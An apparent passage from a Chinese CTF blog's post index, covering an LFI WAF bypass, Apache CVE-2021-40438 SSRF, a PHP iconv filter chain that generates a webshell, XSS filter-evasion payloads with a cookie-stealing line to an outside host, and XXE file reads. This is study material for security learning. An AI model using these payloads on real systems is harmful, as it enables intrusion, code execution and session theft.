速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用compress.zlib://ftp://形式，控制 FTP 速度即可 3.bypass waf if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']); } 这里 利用http长链接的形式，利用stripos和include_one之间的时间窗进行绕过，具体来说是首先发送 一段长数据，在通过stripos的检查后，随即再发送php代码，即可通过 4.获取沙箱路径 我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码： 接下来就是写一下脚本了 感觉自己对整个流程还是很懵逼，理一下吧，先留一下坑吧，没搞懂那些port是在干啥– https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer","link":"/2022/02/04/2021hxp-LFI/"},{"title":"apache cve 2021-40438","text":"前言做题遇到了，但是发现不理解的话，做不了题 URL中的Hostname VS RequestHeader中的Host字段http://hostname:port_no报文中:host: xxxx.xx proxypass&lt;VirtualHost *&gt; ServerAdmin webmaster@localhost ServerName localhost DocumentRoot /usr/local/apache2/htdocs LogLevel notice proxy:trace8 ErrorLog /usr/local/apache2/logs/error.log CustomLog /usr/local/apache2/logs/access.log combined ProxyPass / &quot;http://localhost:4554/&quot; ProxyPassReverse / &quot;http://localhost:4554/&quot;&lt;/VirtualHost&gt; payload http://localhost:80/?unix:(A*4096)|http://localhost:7891/ 过程漏洞点漏洞点出现在proxy_utils.c中的fix_uds_filename函数中对url过滤的不严格，以及对错误处理的逻辑存在问题导致的ssrf漏洞 1.传入fix_uds_filenameurl的hostname已经被mod_proxy模块重新修改为配置文件中指定的后端`hostname(http://localhost:4554/)（在本题中:相当于此时是www.geogle.com?xxx） 2.fix_uds_filename函数的本意主要是用于处理形如unix:/home/www.socket|http://localhost/whatever/含有unix套接字的请求 3.在第二个if条件中，fix_uds_filename首先判断了r-&gt;filename的开头是否为proxy: 4.接着将r-&gt;filename分为了ptr和ptr2两部分，ptr2根据unix:关键字对url进行划分，ptr则根据|符号，从ptr2中进一步划分，提取目标url并赋值给变量rurl。 5.而r-&gt;filename来源于proxy_http_canon函数。这个函数主要的功能是将传入的url进行解析，并拆分为scheme，host，port，path，和query_args（search）等部分，最后拼接&quot;proxy:&quot;, scheme, &quot;://&quot;, host, sport,&quot;/&quot;, path, (search)，赋值给r-&gt;filename,此值来源于以下部分 此时schema=http:host=localhostsport=:4554path=(search) 7.回到fix_uds_filename函数，在对r-&gt;filename进行拆分后，接下来就是本次漏洞最核心的部分uds_path的赋值操作。这里使用ap_runtime_dir_relative对urisock.path进行处理，并将结果赋值给sockpath，以键值对的形式（usd_path: sockpath）存储到r-&gt;notes中。 8.跟进ap_runtime_dir_relative函数，这里引用了arp库中的apr_filepath_merge函数。望文生义，这个函数是用来处理文件路径的合并操作的。而传入该函数的两个重要参数：runtime_dir = &quot;/usr/local/apache2/logs&quot;, file = urisock.path。 9.apr_filepath_merge函数计算了strlen(rootpath) + strlen(addpath) + 4的值，并与APR_PATH_MAX作比较。如果比APR_PATH_MAX大，则返回APR_ENAMETOOLONG常量。这使得上面ap_runtime_dir_relative在处理完路径后，返回的rv状态不为if条件中的状态，从而进入else分支，返回NULL。 此时rootpath就是runtime_dir传入的值 10.APR_PATH_MAX定义在arp.h头文件中，而在linux系统上，PATH_MAX定义在linux/limits.h中，值为4096。因此需要填充的addpath的最小长度为4096 - strlen(rootpath) - 4 = 4069。 11.接下来，在ap_proxy_determine_connection函数中对uds_path进行了初始化。这里我将比较关键的变量都加入到左边的调试窗口中。可以看到，*worker-&gt;s-&gt;uds_path最开始并没有被初始化，因此uds_path = apr_table_get(r-&gt;notes, &quot;uds_path&quot;)。而这里，恰恰是在fix_uds_filename中设置过的键值对 12.如果这里的uds_path != null，那么就会使用unix socket进行后序的通信。因此作者在fix_uds_filename函数中通过使用超长的payload这样巧妙的方法来设置uds_path = null的原因就在于此。只要uds_path = null，那么就会进入2553行的else分支，也就回退到tcp连接。 13.此时conn-&gt;hostname和conn-&gt;port都由uri-&gt;hostname和uri-&gt;port进行控制。在此之前，已经调用过apr_uri_parse处理url，得到的hostname和port正是|后的目标url，而这部分内容正是攻击者可控的，因此造成了ssrf漏洞。 payload处理过程分析payload http://localhost:80/?unix:(A*4096)|http://localhost:7891/ 传入以后变成 http://proxypass/?unix:(A*4096)|http://localhost:7891/ 然后经过由于unix过长，再次提取，访问以下内容 http://localhost:7891/ payload curl --header 'Host: geogle.com' &quot;http://httpd.summ3r.top:60010/proxy?unix:$(python3 -c 'print(&quot;A&quot;*4901, end=&quot;&quot;)')|http://internal.host/flag&quot;","link":"/2022/01/29/apache-cve-2021-40438/"},{"title":"渗透测试——内网代理","text":"","link":"/2021/12/12/frp%E9%85%8D%E7%BD%AE/"},{"title":"python爬虫数据分析","text":"beautifulsoupfrom bs4 import BeautifulSoupfile=open(&quot;./xxx.html&quot;,&quot;rb&quot;)htm=file.read().decode('utf-8')bs=BeautifulSoup(html,&quot;html.parser&quot;) 标签及其内容；拿到它所找到的第一个内容 print(bs.title) 只要内容不要标签 print(bs.title.string) bs.a.attrs 获取a标签的所有的属性，返回一个字典bs.a 获取a标签的所有的属性，返回一个字典print(bs.a.sting)#comment 是一个特殊的navigablestring，输出的内容 3.Beautifulsoup 表示整个文档 print(bs.attrs) 遍历正则 bs.find_all(re.conpile(&quot;a&quot;)) find_all()t_list=bs.find_all(&quot;a&quot;)import ret_list=bs.find_all(re.compile(&quot;a&quot;))def name_is_exists(tag): return tag.has_attr(&quot;name&quot;)t_list=bs.find_all(name_is_exists) CSS选择器print(bs.select('title')) 通过标签查找print(bs.select(&quot;.mnav&quot;)) 通过类名来查找print(bs.select(#u1)) 通过id来查找print(bs.select(a[class='bri'])) 通过属性来查找print(bs.select(&quot;head &gt; title&quot;) 通过子标签print(bs.select(&quot;.mnav ~ .bri&quot;)","link":"/2021/12/20/python%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"title":"the-end-of-LFI","text":"前言在hxp中出了两题LFI的题目，这个解法感觉是天花板了，跟着大佬的博客学一手 PHP base64 filter在 p 牛绕过死亡 exit 的文章中，我们知道 对PHP Base64 Filter 来说，会忽略掉非正常编码的字符 所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。 而合法字符的定义为 A-Za-z0-9\\/\\=\\+ 这里有个简单的验证 &lt;?php$a = &quot;\\x1bY\\xffQ\\xfa&quot;; //YQ 为 a 的 base64 编码var_dump(base64_decode($a));// string(1) &quot;a&quot; Iconv LFIinclude一句话getshell有个文件内容为&lt;? php phpinfo();?&gt;的base64编码内容，当我们尝试include的时候就可以成功执行了 include &quot;php://filter/convert.base64-decode/resource=./e&quot;;// the content of e: PD9waHAgcGhwaW5mbygpOw==// base64 code of `&lt;?php phpinfo();` is: PD9waHAgcGhwaW5mbygpOw== (without the backquote) trickinclude函数包含的是base64解码以后的php代码，而在php fiter中有一种convert.iconv的filter，可以将数据集从字符集A转化为字符集B，结合这种filter，转化一些固定的文件内容，经过base64解码以后获得我们的getshell，而由于php base64的宽松型，尽管我们产生了不可见的字符（垃圾字符），也将会被直接去掉。 例子假定我们需要文件内容为14个a字符，首先遍历iconv支持的字符编码形式 $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;; //我们这里简单使用 `data://` 来模拟文件内容读取。var_dump(file_get_contents($url));// hexdump:// 00000000 73 74 72 69 6e 67 28 31 38 29 20 22 1b 24 29 43 |string(18) &quot;.$)C|// 00000010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 22 0a |aaaaaaaaaaaaaa&quot;.| 我们看到最终的输出结果有垃圾字符，还有一个C还有我们需要的内容a，而如果直接经过base64编码，C也会被和a一起编码。导致最终结果出错，所以我们可以先经过一个base64编码，然后再解码，因为编码以后，垃圾字符已经被去掉了，就只剩下C和a，在解码以后以后，就是完整的正确数据了。 $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;|convert.base64-decode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 31 31 29 20 22 09 a6 9a 69 |string(11) &quot;...i|// 00000010 a6 9a 69 a6 9a 69 a6 22 0a |..i..i.&quot;.|$url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 31 32 29 20 22 43 61 61 61 |string(12) &quot;Caaa|// 00000010 61 61 61 61 61 61 61 61 22 0a |aaaaaaaa&quot;.| Craft Base64 Payload那我们应该怎么构造需要的内容呢？因为 base64 编码合法字符里面并没有尖括号，所以我们不能通过以上方式直接产生 PHP 代码进行包含，但是我们可以通过以上技巧来产生一个 base64 字符串，最后再使用一次 base64 解码一次就可以了。 例如我们生成 PAaaaaa ，最后经过 base64 解码得到第一个字符为 &lt; ，后续为其他不需要的字符（我们这里不需要的字符称为垃圾字符）的字符串。 所以我们接下来需要做的，就是利用以上技巧找到这么一类编码，可以只存在我们需要的构造一个 webshell 的 base64 字符串了。 我们先看作者使用的几个示例，例如字符 8 ，我们可以使用 convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2 来生成 $url = &quot;php://filter/&quot;;$url = $url.&quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url = $url.&quot;|convert.base64-decode|convert.base64-encode|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;// $url = $url.&quot;|convert.base64-decode|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 35 32 29 20 22 38 01 fe 00 |string(52) &quot;8...|// 00000010 43 00 00 00 61 00 00 00 61 00 00 00 61 00 00 00 |C...a...a...a...|// 00000020 61 00 00 00 61 00 00 00 61 00 00 00 61 00 00 00 |a...a...a...a...|// *// 00000040 22 0a |&quot;.|// 起用了注释那一行后，即还原到 Base64 之后的 hexdump:// 00000000 73 74 72 69 6e 67 28 31 32 29 20 22 38 43 61 61 |string(12) &quot;8Caa|// 00000010 61 61 61 61 61 61 61 61 22 0a |aaaaaaaa&quot;.| 我们可以通过这种形式来将前面部分的构造成我们所需要的 base64 字符串，最后 base64 解码即可成为我们想要的 PHP 代码了。 难点思考看到这里其实有一些，还是不是特别懂如何利用这些编码来构造出字符 可以看到，是利用iconv的一个转码，使得原本的文本在经过转码以后，生出了其他字符，从而获得我们所需要的字符，可以看到左边的s8C就是我们使用三种字符串编码的转码以后所得到的内容。根据这个特性，我们就可以遍历iconv获得我们需要的所有字符 RCE因为最终的 base64 字符串，是由 iconv 相对应的编码规则生成的，所以我们最好通过已有的编码规则来适当地匹配自己想要的 webshell ，比如 &lt;?=`$_GET[0]`;;?&gt;#base64_encode:PD89YCRfR0VUWzBdYDs7Pz4= 接下来就是使用字符集获得这一串字符 我直接使用网上的脚本发现在P和f的转化是失败的，找不到这个字符集 我就查了一下，发现其中有一个字符集的写法似乎会随版本变化而改变，换了一下发现就成功了 shift_jisx0213、shiftjisx0213就是这两个换一下，就行了，接下来经过脚本的解码就可以得到 贴一下脚本 &lt;?php$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;$conversions = array( 'R' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2', 'B' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2', 'C' =&gt; 'convert.iconv.UTF8.CSISO2022KR', '8' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2', '9' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB', 'f' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFT_JISX0213', 's' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61', 'z' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS', 'U' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932', 'P' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFT_JISX0213', 'V' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5', '0' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2', 'Y' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2', 'W' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2', 'd' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2', 'D' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2', '7' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2', '4' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2');$filters = &quot;convert.base64-encode|&quot;;# make sure to get rid of any equal signs in both the string we just generated and the rest of the file$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;foreach (str_split(strrev($base64_payload)) as $c) { $filters .= $conversions[$c] . &quot;|&quot;; $filters .= &quot;convert.base64-decode|&quot;; $filters .= &quot;convert.base64-encode|&quot;; $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;}$filters .= &quot;convert.base64-decode&quot;;$final_payload = &quot;php://filter/{$filters}/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;// echo $final_payload;var_dump(file_get_contents($final_payload)); 这里有几点需要注意的是 1.convert.iconv.UTF8.UTF7 将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让 convert.base64-decode 过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。但是实际测试貌似我遇到的情况并没有抛出 Error ，最差情况抛出了 warning 但不是特别影响，但是为了避免奇怪的错误，还是加上为好。2.data://,后的数据是为了方便展示，需要补足一定的位数，（这里要包含任何文件都可以，但是需要包含一个文件，让字符集有施展的空间） fuzz字符集的寻找是很关键的，上面是凑巧两个字符集换一下就可以得到结果，而如果要寻找其他字符集，没有一定的技巧也是很难找到的。 假设我们需要寻找的字符为x x必须在最终生成的字符串的前段（便于排序位置） 字符串的前端的字符当中，最好的情况是只存在唯一一个x对PHP base64来说合法的字符。 如果没办法找到单个字符，可以用多个字符来合并生成，例子如下： 首先，使用iconv -l可以获得所有的字符集 以生成8的字符集为例，通过不断的拼接新的字符集就可以产生了 $url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));$url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));$url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url)); 已经有师傅将基本上所有的字符都fuzz出来了 wupco：https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT garbage string如果找不到可用文件，我们可以利用convert.iconv.UTF8.CSISO2022KR字符集，因为他总是会在字符串前面生成\\x1b$)C ，所以我们可以利用这个来产生足够的垃圾数据供我们构造 Payload ，以下用一个空文件生成一个 8 来测试 $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|&quot;;$url .= &quot;convert.base64-encode|&quot;;$url .= &quot;convert.iconv.UTF8.UTF7|&quot;;// 8$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;$url = $url.&quot;|convert.base64-decode|convert.base64-encode&quot;;$url = $url.&quot;/resource=./e&quot;;var_dump(file_get_contents($url));","link":"/2022/01/17/the-end-of-LFI/"},{"title":"xss组合启发","text":"xss入门在这里就说说从一道ctf的xss题目以及在做这个题目的时候所遇到的一些知识还有想法’’ &lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt; &lt;img src=&quot;x&quot; onerror=&quot;this.alt=document.getElementsByTagName('script')[0].innerHTML&quot;/&gt; 选择合适的xss语句首先我们需要观察，xss从何插入，插入以后我们是否可以点击 &lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;&lt;!--均在chrome测试--&gt;&lt;!--style onreadystatechange=alert(0)--&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;!--alert(1)--&gt;&lt;!--xml onreadystatechange=alert(2)--&gt;&lt;!--object data=&quot;data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;&quot;--&gt;&lt;Img src=&quot;&quot; onerror=&quot;alert(4)&quot;/&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(5)&quot;/&gt;&lt;img src=&quot;&quot; onerror=&quot;javascript:alert(6)&quot;/&gt;&lt;[%00] img onerror=alert(10) src=a&gt;&lt;!--不执行--&gt;&lt;i[%00]mg onerror=alert(11) src=a&gt;&lt;!--不执行--&gt;&lt;img/onerror=alert(12) src=a&gt;&lt;img [%09] onerror=alert(13) src=a&gt;&lt;img/&quot; onerror=alert(14) src=a&gt;&lt;img/onerror=alert(140) src=a&gt;&lt;img/anyjunk/onerror=alert(15) src=a&gt;&lt;img o[%00]nerror=alert(16) src=a&gt;&lt;!--不执行--&gt;&lt;script/anyjunk&gt;alert(17)&lt;/script&gt;&lt;body onbeforeactivate=alert(18)&gt;&lt;!--iframe onreadystatechange=alert(19)--&gt;&lt;object onerror=alert(20)&gt;&lt;!--不执行--&gt;&lt;!--input autofocus onfocus=alert(21)--&gt;&lt;a&gt;here here&lt;/a onmousemove=alert(22)&gt;&lt;!--不执行--&gt;&lt;video src=1 onerror=alert(23)&gt;&lt;embed src=javascript:alert(24)&gt;&lt;!--不执行--&gt;&lt;x style=behavior:url(#default#time2) onbegin=alert(25)&gt; &lt;!--不执行--&gt;&lt;img onerror=&quot;alert(25)&quot;src=a&gt;&lt;img onerror='alert(26)'src=a&gt;&lt;img onerror=`alert(27)`src=a&gt;&lt;!--chorme不执行--&gt;&lt;img/onerror=&quot;alert(28)&quot;src=a&gt;&lt;&lt;img onerror=alert(29) src=a&gt;&gt;%253cimg%20onerror=alert(30)%20src=a%253e，首先被过滤器解码%3cimg onerror=alert(31) src=a%3e，后备浏览器解码为&lt;img onerror=alert(30) src=a&gt;&lt;img onerror=a&amp;#x0006c;ert(31) src=a&gt;使用十进制或者十六进制代替html编码，并添加多个前导0并省略结尾的分号&lt;img onerror=a&amp;#0108ert(32) src=a&gt;使用十进制或者十六进制代替html编码，并添加多个前导0并省略结尾的分号&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;33&amp;#x29;&gt;&lt;img onerror=a&amp;#x6c;ert(34) src=a&gt;&lt;&lt;script&gt;alert(35);//&lt;&lt;/script&gt;&lt;script&lt;{alert(36)}/&gt;&lt;/script&gt;&lt;!--不执行--&gt;&lt;body onscroll=alert(37)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;....&lt;input autoocus&gt;&lt;input onblur=alert(38) autofocus&gt;&lt;input autofocus&gt;%u00ABimg onerror=alert(39) src=a%u00bb，unicode编码非标准编码避开过滤，UTF-7,US-ASCII,UTF-16，多字节字符集Shift-JIS,EUC-JP,BIG5(条件是控制Content-type或者对应的html元标签、charset)///避开过滤，脚本代码：&lt;script&gt;a\\u006cert(40)&lt;/script&gt;;unicode&lt;script&gt;eval('a\\u006cert(41)')&lt;/script&gt;;unicode&lt;script&gt;eval('a\\x6cert(42)')&lt;/script&gt;;16进制&lt;script&gt;eval('a\\154ert(43)')&lt;/script&gt;;10进制&lt;script&gt;eval('a\\l\\ert\\(44\\)')&lt;/script&gt;;eval中多余转义被忽略&lt;script&gt;eval('al' +'ert\\(45\\)')&lt;/script&gt;;动态构建&lt;script&gt;eval('al' +'ert(46)')&lt;/script&gt;;动态构建带多余转义&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41));动态构建&lt;/script&gt;;alert(1)&lt;script&gt;eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));&lt;/script&gt;;动态构建&lt;/script&gt;;alert(1)&lt;script&gt;'alert(49)'.replace(/.+/,eval)&lt;/script&gt;;无法直接使用eval的情况&lt;script&gt;function::['alert'](50)&lt;/script&gt;;无法直接使用eval的情况&lt;script&gt;alert(document['cookie'])&lt;/script&gt;;替代圆点&lt;script&gt;with(document)alert(cookie)&lt;/script&gt;;替代圆点 以上展示的均为执行脚本的情况，如果script被过滤了，那么就只能使用其他标签，并选择使用javascript来执行并输出进行替代 触发事件1、onmouseenter：当鼠标进入选区执行代码2、onmouseleave：当鼠标离开选区执行代码3、onmousewheel：当鼠标在选区滚轮时执行代码4、onscroll：拖动滚动条执行代码5、onfocusin：当获得焦点时执行代码6、onfocusout：当失去焦点时执行代码7、onstart：当显示内容时执行代码8、onbeforecopy：选中内容后右键执行代码9、onbeforecut：选中内容后右键执行代码10、onbeforeeditfocus：当获得焦点时执行代码11、onbeforepaste：选中内容后右键执行代码12、oncontextmenu：鼠标右键执行代码13、oncopy：鼠标右键执行复制时执行代码14、oncut：鼠标右键执行剪切时执行代码15、ondrag：选择内容并拖动时执行代码16、ondragend：选择内容并拖动松开鼠标执行代码17、ondragenter：选择内容并拖动时执行代码18、ondragleave：选择内容并拖出边框执行代码19、ondragover：选择内容并拖动时执行代码20、ondragstart：选择内容并拖动时执行代码21、ondrop：有内容被拖动进来时执行代码22、onlosecapture：选择内容时执行代码23、onpaste：粘贴时执行代码24、onselectstart：选择内容时执行代码25、onhelp：进入焦点按F1时执行代码26、onEnd：当时间线执行完毕时执行代码27、onBegin：当时间线开始执行代码28、onactivate：激活当前标签时执行代码29、onfilterchange：当滤镜改变时执行代码30、onbeforeactivate：当激活当前标签时执行代码31、onbeforedeactivate：当标签内值改变时执行代码32、ondeactivate：当标签内值改变时执行代码33、onerror:加载错误时触发 在xss中，如果script被过滤， 无法直接执行出结果时，这个时候就要使用其他组合拳，也就是合适的标签搭配合适的事件，比如说我们使用img标签时，我们后面要执行的是一个脚本语句，那么这个时候一定是加载图片错误的，就可以使用onerror事件触发我们的脚本 xss组合这个时候，我们已经可以用onerror触发我们的脚本了，但是我们需要的是文字，所以这个时候我们还需要寻找一个当图片加载失败时，能够回显文字的东西 alt是一个必需的属性，它规定在图像无法显示时的替代文本。alt属性是用来对网页上的图片进行描述，光标在图片上时显示的提示语即采用该标签实现。 所以当图片不能正常显示时，就会执行onerror的内容，onerror的内容便是回显一个alt this.alt=document.getElementsByTagName('script')[0].innerHTML documentdocument中有许多获取文本内容的方法，或者是其他一些关键信息的方法 通过ID获取（getElementById）通过name属性（getElementsByName）通过标签名（getElementsByTagName）通过类名（getElementsByClassName）获取html的方法（document.documentElement）获取body的方法（document.body）通过选择器获取一个元素（querySelector）通过选择器获取一组元素（querySelectorAll）//但是一般还要再后面加上一个.innerHTML","link":"/2022/01/30/xss/"},{"title":"2021美团高校挑战赛","text":"一开始是一个xml外部实体注入,可以读一下文件 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt; 读到了php-fpm.conf的配置文件 file://%2fetc%2fphp%2f7%2e0%2ffpm%2fphp-fpm%2econf 错误日志地址 /var/log/php7.0-fpm.log/run/php/php7.0-fpm.pidmysql:x:105:106:MySQL Server,,,:/nonexistent:/bin/false 读到内网地址 127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetfe00::0 ip6-mcastprefixfe00::1 ip6-allnodesfe00::2 ip6-allrouters10.4.104.98 engine-1 读proc/net/arp 10.4.255.253 读到源码 &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;ç»å½&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign In&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doLogin()&quot; &gt;Sign In&lt;/button&gt; &lt;p class=&quot;mt-5 text-muted&quot;&gt;Don't have an account yet? &lt;a href=&quot;register.php&quot;&gt;Sign Up&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt; &lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;./static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doLogin(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;login.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ 